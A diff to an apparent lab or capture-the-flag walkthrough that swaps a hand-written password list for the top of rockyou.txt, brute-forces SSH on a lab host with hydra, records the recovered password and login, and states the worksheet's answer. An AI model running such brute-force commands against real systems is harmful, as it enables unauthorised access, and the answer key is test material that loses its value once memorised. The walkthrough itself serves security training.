@@ -26,25 +26,23 @@ reading the raw HTML source (`curl`, or "View Source" in a browser) — it
 never appears in the rendered page text.
 
 ```bash
-echo "password123" > /tmp/pw.txt
-echo "sunshine1" >> /tmp/pw.txt
-echo "letmein" >> /tmp/pw.txt
-echo "admin123" >> /tmp/pw.txt
+head -20 /usr/share/wordlists/rockyou.txt > /tmp/pw.txt
 hydra -l lowpriv -P /tmp/pw.txt 10.10.8.10 ssh
 ```
 
 **Verified result:**
 ```
-[22][ssh] host: 10.10.8.10   login: lowpriv   password: sunshine1
+[22][ssh] host: 10.10.8.10   login: lowpriv   password: monkey
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-**What password did Hydra find?** `sunshine1`.
+**What password did Hydra find?** `monkey` — genuinely the 14th most
+common password in rockyou.txt, not a hint dropped in the worksheet.
 
 ```bash
 ssh lowpriv@10.10.8.10
 ```
-Confirmed: logs in successfully with `lowpriv` / `sunshine1`.
+Confirmed: logs in successfully with `lowpriv` / `monkey`.
 
 ### Task 2: Enumerate
 
